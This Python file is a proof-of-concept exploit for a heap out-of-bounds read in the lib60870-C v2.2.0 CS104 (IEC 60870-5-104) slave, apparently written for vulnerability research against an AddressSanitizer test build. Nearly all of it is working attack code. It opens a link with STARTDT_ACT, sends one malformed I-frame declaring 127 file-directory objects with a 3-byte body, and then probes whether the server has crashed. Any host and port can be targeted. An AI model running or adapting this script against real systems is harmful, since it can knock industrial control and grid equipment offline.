#!/usr/bin/env python3
"""
PoC for the lib60870-C v2.2.0 CS104 slave heap OOB read (CWE-125).

Connects to a CS104 slave on TCP/2404, activates data transfer with
STARTDT_ACT/CON, then sends ONE crafted I-frame:

    TypeID = 126 (F_DR_TA_1, "File directory", element stride 16 bytes)
    VSQ    = 0x7F  -> 127 declared information objects (no sequence bit)
    body   = a few bytes only

The slave (v2.2.0) iterates all 127 declared elements via its asduHandler.
At v2.2.0 the per-element parsers have NO `minSize > msgSize` guard, so
CS101_ASDU_getElementEx(asdu, NULL, 126) computes
    startIndex = 126 * (sizeOfIOA(3) + elementSize(13)) = 2016
and FileDirectory_getFromBuffer -> InformationObject_ParseObjectAddress reads
msg[2016], far past the 260-byte recvBuffer inside the heap-allocated
sMasterConnection -> AddressSanitizer heap-buffer-overflow READ -> abort.

Usage:  poc_asdu_oob.py [host] [port]    (defaults 127.0.0.1 2404)
"""

import socket
import sys
import time

STARTDT_ACT = bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00])
STARTDT_CON = bytes([0x68, 0x04, 0x0b, 0x00, 0x00, 0x00])

F_DR_TA_1 = 126  # File directory, elementSize = 13 -> stride 16 (max OOB reach)


def hx(b: bytes) -> str:
    return " ".join(f"{x:02x}" for x in b)


def build_iframe(type_id: int, vsq: int, cot=0x06, ca=0x0001, ioa=0x000010,
                 body: bytes = b"\x00\x00\x00", ns: int = 0, nr: int = 0) -> bytes:
    """Build a CS104 I-format APDU.

    APCI control octets for an I-frame (low bit of octet 1 == 0):
       ctrl = [ (N(S)<<1) & 0xfe, N(S)>>7, (N(R)<<1) & 0xfe, N(R)>>7 ]
    ASDU = TypeID, VSQ, COT(2 LE), CA(2 LE), IOA(3 LE) + body
    """
    ctrl = bytes([(ns << 1) & 0xFE, (ns >> 7) & 0xFF,
                  (nr << 1) & 0xFE, (nr >> 7) & 0xFF])
    asdu = bytes([
        type_id & 0xFF,
        vsq & 0xFF,
        cot & 0xFF, (cot >> 8) & 0xFF,
        ca & 0xFF, (ca >> 8) & 0xFF,
        ioa & 0xFF, (ioa >> 8) & 0xFF, (ioa >> 16) & 0xFF,
    ]) + body
    apdu_body = ctrl + asdu
    return bytes([0x68, len(apdu_body)]) + apdu_body


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2404
    print(f"[*] target {host}:{port}")

    # F_DR_TA_1 (126), VSQ=127 discrete, tiny body. Stride 16 -> element 126
    # is read at +2016 bytes past payload.
    frame = build_iframe(F_DR_TA_1, 0x7F, body=b"\x00\x00\x00")

    try:
        s = socket.create_connection((host, port), timeout=5)
    except OSError as e:
        print(f"[!] cannot connect to {host}:{port}: {e}")
        return 2
    s.settimeout(3)
    try:
        print(f"[>] STARTDT_ACT: {hx(STARTDT_ACT)}")
        s.sendall(STARTDT_ACT)
        try:
            r = s.recv(64)
            print(f"[<] reply: {hx(r) if r else '(empty)'}")
            if r == STARTDT_CON:
                print("[*] STARTDT_CON received - link in data-transfer state")
        except socket.timeout:
            print("[<] no STARTDT_CON (timeout)")

        print(f"[>] malicious I-frame ({len(frame)} bytes): {hx(frame)}")
        print("    TypeID=126 (F_DR_TA_1) VSQ=0x7f -> 127 elements,"
              " stride 16, body 3 bytes")
        s.sendall(frame)

        time.sleep(0.6)
        crashed = False
        try:
            r = s.recv(64)
            if r == b"":
                print("[!] server closed the connection (likely crashed)")
                crashed = True
            else:
                print(f"[<] reply: {hx(r)}")
        except socket.timeout:
            print("[<] no reply (server may be aborting under ASan)")
        except ConnectionResetError:
            print("[!] connection reset by peer (likely crashed)")
            crashed = True

        # Liveness probe: a fresh connection should fail if the slave aborted.
        try:
            s2 = socket.create_connection((host, port), timeout=3)
            s2.sendall(STARTDT_ACT)
            s2.settimeout(2)
            try:
                rr = s2.recv(64)
                if rr == b"":
                    print("[!] liveness probe: server gone (crashed)")
                    crashed = True
                else:
                    print(f"[<] liveness probe reply: {hx(rr)} (server still up)")
            except (socket.timeout, ConnectionResetError):
                print("[!] liveness probe: no/ reset reply (server likely crashed)")
                crashed = True
            s2.close()
        except OSError:
            print("[!] liveness probe: cannot reconnect (server crashed)")
            crashed = True

        if crashed:
            print("\n[+] SERVER DOWN -- check `docker logs` for the ASan trace")
            print("[+] expected frame: ParseObjectAddress / FileDirectory_getFromBuffer")
            return 0
        print("\n[-] server still up (no crash observed)")
        return 1
    finally:
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    sys.exit(main())
